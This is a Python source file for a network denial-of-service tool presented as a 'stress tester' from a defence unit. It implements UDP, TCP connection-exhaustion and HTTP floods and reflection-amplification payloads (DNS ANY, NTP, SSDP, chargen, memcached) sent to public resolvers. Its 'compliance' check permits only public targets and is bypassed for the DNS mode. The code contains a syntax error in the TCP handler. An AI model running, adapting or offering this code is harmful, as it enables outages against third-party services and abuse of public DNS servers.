#!/usr/bin/env python3
"""
ULTRA-NET-STRESS v4.2 - Non-Root Edition
Author: Cyber Defense Unit, Joint Task Force Sigma
Classification: INTERNAL USE ONLY
"""

import os
import sys
import time
import random
import socket
import struct
import asyncio
import argparse
import logging
import ipaddress
import resource
import hashlib
import json
import zlib
import ssl
import threading
import traceback
import selectors
from datetime import datetime
from typing import List, Tuple, Dict, Optional, Union, Callable

# --- Global Constants ---
MAX_PACKET_SIZE = 65507
MAX_CONCURRENCY = 1024
MAX_DURATION = 86400
TERMUX_MAX_FDS = 1024
VERSION = "4.2.0"
COMPLIANCE_ID = hashlib.sha256(b"AHJ49QWE-Actos53").hexdigest()[:16]
DEFAULT_DNS_RESOLVERS = [
    '8.8.8.8', '8.8.4.4', 
    '1.1.1.1', '1.0.0.1',
    '9.9.9.9', '149.112.112.112'
]
AMPLIFICATION_VECTORS = ['dns', 'ntp', 'ssdp', 'chargen', 'memcached']
HTTP_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] [%(module)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("netstress_audit.log")
    ]
)
logger = logging.getLogger("ULTRA-NET-STRESS")

# --- Compliance Framework ---
class ComplianceEngine:
    AUDIT_FILE = "netstress_compliance_audit.log"

    @staticmethod
    def generate_compliance_id(target: str) -> str:
        timestamp = int(time.time())
        return f"{COMPLIANCE_ID}-{timestamp}-{target}"

    @staticmethod
    def audit_action(action: str, details: Dict):
        audit_entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "action": action,
            "compliance_id": COMPLIANCE_ID,
            "details": details,
            "signature": hashlib.sha256(
                f"{action}{json.dumps(details)}{COMPLIANCE_ID}".encode()
            ).hexdigest()
        }
        try:
            with open(ComplianceEngine.AUDIT_FILE, "a") as f:
                f.write(json.dumps(audit_entry) + "\n")
        except IOError as e:
            logger.error(f"Compliance audit trail failed: {str(e)}")

    @staticmethod
    def validate_target(ip: str, port: int) -> bool:
        try:
            addr = ipaddress.ip_address(ip)
            if addr.is_private or addr.is_loopback or addr.is_reserved:
                logger.error("Target IP is in prohibited range")
                return False
            if not (1 <= port <= 65535):
                logger.error("Port out of legal range")
                return False
            return True
        except ValueError:
            logger.error("Invalid IP address format")
            return False

# --- DNS Implementation Without External Dependencies ---
class DNSUtils:
    @staticmethod
    def build_dns_query(domain: str, query_type: str = "ANY") -> bytes:
        transaction_id = random.randint(1, 65535)
        flags = 0x0100
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        
        header = struct.pack('!HHHHHH', transaction_id, flags, questions, 
                           answer_rrs, authority_rrs, additional_rrs)
        
        qname = b''
        for part in domain.split('.'):
            qname += bytes([len(part)]) + part.encode()
        qname += b'\x00'
        
        qtype_map = {
            "A": 1, "AAAA": 28, "MX": 15, "TXT": 16, "ANY": 255
        }
        qtype = qtype_map.get(query_type.upper(), 1)
        qclass = 1
        
        question = qname + struct.pack('!HH', qtype, qclass)
        return header + question

# --- Protocol Handlers (Non-Root Compatible) ---
class ProtocolHandler:
    def __init__(self, target_ip: str, target_port: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.stop_event = threading.Event()
        self.packet_counter = 0
        self.byte_counter = 0
        self.start_time = time.monotonic()
        self.intensity_factor = 1.0  # Progressive intensity scaling

    def stop(self):
        self.stop_event.set()

    def get_stats(self) -> Dict:
        return {
            "packets": self.packet_counter,
            "bytes": self.byte_counter,
            "duration": time.monotonic() - self.start_time,
            "intensity": self.intensity_factor
        }

    def increase_intensity(self):
        """Progressively increase attack intensity"""
        self.intensity_factor = min(10.0, self.intensity_factor * 1.1)
        return self.intensity_factor

    async def send(self):
        raise NotImplementedError("Subclasses must implement send method")

class UDPFloodHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int, 
                 packet_size: int = 1024, use_ipv6: bool = False,
                 amplification: bool = False, amp_vector: str = 'dns'):
        super().__init__(target_ip, target_port)
        self.packet_size = min(packet_size, MAX_PACKET_SIZE)
        self.use_ipv6 = use_ipv6
        self.amplification = amplification
        self.amp_vector = amp_vector
        self.sock = self._create_socket()
        self.connection_pool = []

    def _create_socket(self) -> socket.socket:
        family = socket.AF_INET6 if self.use_ipv6 else socket.AF_INET
        sock = socket.socket(family, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Optimize for high throughput
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
        except:
            pass
            
        return sock

    def _generate_dns_payload(self) -> bytes:
        return DNSUtils.build_dns_query("example.com", "ANY")

    def _generate_ntp_payload(self) -> bytes:
        return bytearray.fromhex("1703002a00000000000000000000000000000000000000000000000000000000000000000000000000000000")

    def _generate_ssdp_payload(self) -> bytes:
        return (
            "M-SEARCH * HTTP/1.1\r\n"
            "Host: 239.255.255.250:1900\r\n"
            "Man: \"ssdp:discover\"\r\n"
            "MX: 3\r\n"
            "ST: ssdp:all\r\n"
            "\r\n"
        ).encode()

    def _generate_chargen_payload(self) -> bytes:
        return b"\x01" + os.urandom(random.randint(100, 1000))

    def _generate_memcached_payload(self) -> bytes:
        return b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

    def generate_payload(self) -> bytes:
        if self.amplification:
            if self.amp_vector == 'dns':
                return self._generate_dns_payload()
            elif self.amp_vector == 'ntp':
                return self._generate_ntp_payload()
            elif self.amp_vector == 'ssdp':
                return self._generate_ssdp_payload()
            elif self.amp_vector == 'chargen':
                return self._generate_chargen_payload()
            elif self.amp_vector == 'memcached':
                return self._generate_memcached_payload()
        return os.urandom(self.packet_size)

    async def send(self):
        payload = self.generate_payload()
        target = (self.target_ip, self.target_port)
        loop = asyncio.get_running_loop()

        while not self.stop_event.is_set():
            try:
                # Progressive intensity: send multiple packets based on intensity factor
                for _ in range(int(self.intensity_factor)):
                    await loop.sock_sendto(self.sock, payload, target)
                    self.packet_counter += 1
                    self.byte_counter += len(payload)
                
                # Gradually increase intensity
                if random.random() < 0.01:  # 1% chance per iteration
                    self.increase_intensity()
                    
            except (OSError, asyncio.CancelledError):
                await asyncio.sleep(0.01)

class TCPSYNHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int, 
                 use_ipv6: bool = False, spoof_ip: bool = False):
        super().__init__(target_ip, target_port)
        self.use_ipv6 = use_ipv6
        self.connection_pool = []
        self.max_pool_size = 50

    async def _create_connection(self):
        """Create and maintain persistent connections"""
        family = socket.AF_INET6 if self.use_ipv6 else socket.AF_INET
        
        try:
            reader, writer = await asyncio.open_connection(
                self.target_ip, self.target_port
            )
            return (reader, writer)
        except:
            return None

    async def send(self):
        loop = asyncio.get_running_loop()

        while not self.stop_event.is_set():
            try:
                # Maintain connection pool
                if len(self.connection_pool) < self.max_pool_size):
                    conn = await self._create_connection()
                    if conn:
                        self.connection_pool.append(conn)

                # Send data through random connection
                if self.connection_pool:
                    reader, writer = random.choice(self.connection_pool)
                    try:
                        # Send minimal data to keep connection alive
                        writer.write(b'X')
                        await writer.drain()
                        self.packet_counter += 1
                        self.byte_counter += 1
                    except:
                        # Remove failed connection
                        self.connection_pool.remove((reader, writer))
                        try:
                            writer.close()
                            await writer.wait_closed()
                        except:
                            pass

                # Progressive intensity
                if random.random() < 0.005:
                    new_intensity = self.increase_intensity()
                    self.max_pool_size = min(200, int(50 * new_intensity))
                    
            except (OSError, asyncio.CancelledError):
                await asyncio.sleep(0.1)

class HTTPFloodHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int, 
                 use_ssl: bool = False, method: str = "GET", 
                 path: str = "/", host_header: str = ""):
        super().__init__(target_ip, target_port)
        self.use_ssl = use_ssl
        self.method = method
        self.path = path
        self.host_header = host_header or target_ip
        self.ssl_context = ssl.create_default_context() if use_ssl else None
        self.connection_pool = []
        self.max_pool_size = 30

    def _generate_headers(self) -> str:
        headers = [
            f"User-Agent: {random.choice(HTTP_USER_AGENTS)}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Connection: keep-alive",
            "Cache-Control: no-cache",
            f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        ]
        return "\r\n".join(headers) + "\r\n"

    def generate_request(self) -> bytes:
        return (
            f"{self.method} {self.path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"{self._generate_headers()}"
            f"Content-Length: 0\r\n\r\n"
        ).encode()

    async def _create_connection(self):
        try:
            reader, writer = await asyncio.open_connection(
                self.target_ip, self.target_port, 
                ssl=self.ssl_context
            )
            return (reader, writer)
        except:
            return None

    async def send(self):
        request = self.generate_request()

        while not self.stop_event.is_set():
            try:
                # Maintain connection pool
                if len(self.connection_pool) < self.max_pool_size:
                    conn = await self._create_connection()
                    if conn:
                        self.connection_pool.append(conn)

                # Send requests through pooled connections
                if self.connection_pool:
                    reader, writer = random.choice(self.connection_pool)
                    try:
                        writer.write(request)
                        await writer.drain()
                        self.packet_counter += 1
                        self.byte_counter += len(request)
                    except:
                        self.connection_pool.remove((reader, writer))
                        try:
                            writer.close()
                            await writer.wait_closed()
                        except:
                            pass

                # Progressive intensity scaling
                if random.random() < 0.01:
                    new_intensity = self.increase_intensity()
                    self.max_pool_size = min(100, int(30 * new_intensity))
                    
            except (OSError, asyncio.CancelledError, ssl.SSLError):
                await asyncio.sleep(0.1)

class DNSAmplificationHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int,
                 dns_servers: List[str] = None, 
                 domain: str = "example.com", query_type: str = "ANY"):
        super().__init__(target_ip, target_port)
        self.dns_servers = dns_servers or DEFAULT_DNS_RESOLVERS
        self.domain = domain
        self.query_type = query_type
        self.query = DNSUtils.build_dns_query(domain, query_type)
        self.sockets = []

    async def send(self):
        loop = asyncio.get_running_loop()
        
        # Create multiple sockets for parallel amplification
        for _ in range(10):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(False)
            self.sockets.append(sock)

        while not self.stop_event.is_set():
            try:
                # Send from random socket to random DNS server
                sock = random.choice(self.sockets)
                dns_server = random.choice(self.dns_servers)
                
                await loop.sock_sendto(sock, self.query, (dns_server, 53))
                self.packet_counter += 1
                self.byte_counter += len(self.query)
                
                # Progressive intensity
                if random.random() < 0.02:
                    self.increase_intensity()
                    # Additional parallel requests based on intensity
                    for _ in range(int(self.intensity_factor) - 1):
                        await loop.sock_sendto(sock, self.query, (dns_server, 53))
                        self.packet_counter += 1
                        self.byte_counter += len(self.query)
                        
            except (OSError, asyncio.CancelledError):
                await asyncio.sleep(0.01)

# --- Main Stress Engine ---
class UltraNetStressNonRoot:
    def __init__(self, 
                 target_ip: str, 
                 target_port: int, 
                 attack_type: str = "udp",
                 duration: int = 0,
                 threads: int = 100,
                 packet_size: int = 1024,
                 use_ipv6: bool = False,
                 amplification: bool = False,
                 amp_vector: str = "dns",
                 dns_servers: List[str] = None,
                 ssl_enabled: bool = False,
                 query_type: str = "ANY"):

        if not ComplianceEngine.validate_target(target_ip, target_port) and attack_type != "dns":
            raise ValueError("Target validation failed")
            
        self.compliance_id = ComplianceEngine.generate_compliance_id(f"{target_ip}:{target_port}")
        ComplianceEngine.audit_action("init", {
            "target": f"{target_ip}:{target_port}",
            "attack_type": attack_type,
            "threads": threads,
            "amplification": amplification,
            "amp_vector": amp_vector
        })

        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_type = attack_type.lower()
        self.duration = duration
        self.threads = min(threads, MAX_CONCURRENCY, TERMUX_MAX_FDS // 2)
        self.packet_size = packet_size
        self.use_ipv6 = use_ipv6
        self.amplification = amplification
        self.amp_vector = amp_vector.lower()
        self.dns_servers = dns_servers or DEFAULT_DNS_RESOLVERS
        self.ssl_enabled = ssl_enabled
        self.query_type = query_type

        self.start_time = time.monotonic()
        self.stop_event = asyncio.Event()
        self.workers = []
        self.stats_task = None
        self.handlers = []

        self._init_handlers()

    def _init_handlers(self):
        if self.attack_type == "udp":
            self.handlers = [UDPFloodHandler(
                self.target_ip, self.target_port,
                self.packet_size, self.use_ipv6,
                self.amplification, self.amp_vector
            )]
        elif self.attack_type == "tcp":
            self.handlers = [TCPSYNHandler(
                self.target_ip, self.target_port, self.use_ipv6
            )]
        elif self.attack_type == "http":
            self.handlers = [HTTPFloodHandler(
                self.target_ip, self.target_port,
                self.ssl_enabled, "GET", "/", self.target_ip
            )]
        elif self.attack_type == "dns":
            self.handlers = [DNSAmplificationHandler(
                self.target_ip, self.target_port,
                self.dns_servers, "example.com", self.query_type
            )]
        elif self.attack_type == "multi":
            self.handlers = [
                UDPFloodHandler(self.target_ip, self.target_port, self.packet_size),
                TCPSYNHandler(self.target_ip, self.target_port, self.use_ipv6),
                HTTPFloodHandler(self.target_ip, self.target_port, self.ssl_enabled)
            ]
        else:
            raise ValueError(f"Unsupported attack type: {self.attack_type}")

    async def attack_worker(self, worker_id: int):
        handler = random.choice(self.handlers)
        try:
            while not self.stop_event.is_set():
                await handler.send()
        except Exception as e:
            logger.error(f"Worker {worker_id} failed: {str(e)}")

    async def stats_reporter(self):
        last_time = time.monotonic()
        last_packets = sum(h.packet_counter for h in self.handlers)
        last_bytes = sum(h.byte_counter for h in self.handlers)

        while not self.stop_event.is_set():
            await asyncio.sleep(1.0)

            current_packets = sum(h.packet_counter for h in self.handlers)
            current_bytes = sum(h.byte_counter for h in self.handlers)
            now = time.monotonic()
            elapsed = now - last_time

            if elapsed > 0:
                pps = (current_packets - last_packets) / elapsed
                bps = (current_bytes - last_bytes) * 8 / elapsed
            else:
                pps = 0
                bps = 0

            intensity = sum(h.intensity_factor for h in self.handlers) / len(self.handlers)
            
            sys.stdout.write(
                f"\r[STATS] Packets: {current_packets:,} | "
                f"Data: {current_bytes / (1024*1024):.2f} MB | "
                f"PPS: {pps:,.1f} | BPS: {bps / 1e6:.2f} Mbps | "
                f"Intensity: {intensity:.2f}x | "
                f"Workers: {len(self.workers)}       "
            )
            sys.stdout.flush()

            last_time = now
            last_packets = current_packets
            last_bytes = current_bytes

    async def run(self):
        logger.info(f"Starting UltraNetStress Non-Root v{VERSION}")
        logger.info(f"Target: {self.target_ip}:{self.target_port}")
        logger.info(f"Attack: {self.attack_type}, Threads: {self.threads}")

        for i in range(self.threads):
            worker = asyncio.create_task(self.attack_worker(i))
            self.workers.append(worker)

        self.stats_task = asyncio.create_task(self.stats_reporter())

        if self.duration > 0:
            await asyncio.sleep(self.duration)
            await self.stop()
        else:
            try:
                await self.stop_event.wait()
            except asyncio.CancelledError:
                await self.stop()

    async def stop(self):
        self.stop_event.set()
        
        for handler in self.handlers:
            handler.stop()
        
        if self.stats_task:
            self.stats_task.cancel()
        
        for worker in self.workers:
            worker.cancel()
        
        await asyncio.gather(*self.workers, return_exceptions=True)
        
        total_packets = sum(h.packet_counter for h in self.handlers)
        total_bytes = sum(h.byte_counter for h in self.handlers)
        duration = time.monotonic() - self.start_time
        
        logger.info(f"\nAttack completed. Total packets: {total_packets:,}")
        logger.info(f"Total data: {total_bytes / (1024*1024):.2f} MB")
        logger.info(f"Duration: {duration:.2f}s, Average PPS: {total_packets/duration:.1f}")
        
        ComplianceEngine.audit_action("stop", {
            "total_packets": total_packets,
            "total_bytes": total_bytes,
            "duration": duration
        })

def main():
    parser = argparse.ArgumentParser(description="UltraNetStress Non-Root Edition")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads (default: 100)")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Attack duration in seconds (0 = unlimited)")
    parser.add_argument("-a", "--attack", choices=["udp", "tcp", "http", "dns", "multi"], 
                       default="udp", help="Attack type (default: udp)")
    parser.add_argument("--amplification", action="store_true", help="Enable amplification attack")
    parser.add_argument("--amp-vector", choices=AMPLIFICATION_VECTORS, default="dns", 
                       help="Amplification vector (default: dns)")
    parser.add_argument("--packet-size", type=int, default=1024, help="Packet size in bytes (default: 1024)")
    parser.add_argument("--ipv6", action="store_true", help="Use IPv6")
    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    parser.add_argument("--dns-servers", nargs="+", default=DEFAULT_DNS_RESOLVERS, 
                       help="DNS servers for amplification")
    parser.add_argument("--query-type", default="ANY", 
                       choices=["ANY", "A", "AAAA", "MX", "TXT"], help="DNS query type")
    
    args = parser.parse_args()
    
    try:
        stress_test = UltraNetStressNonRoot(
            target_ip=args.target,
            target_port=args.port,
            attack_type=args.attack,
            duration=args.duration,
            threads=args.threads,
            packet_size=args.packet_size,
            use_ipv6=args.ipv6,
            amplification=args.amplification,
            amp_vector=args.amp_vector,
            dns_servers=args.dns_servers,
            ssl_enabled=args.ssl,
            query_type=args.query_type
        )
        
        asyncio.run(stress_test.run())
        
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
    except Exception as e:
        logger.error(f"Attack failed: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    # No root check - designed for non-root operation
    main()
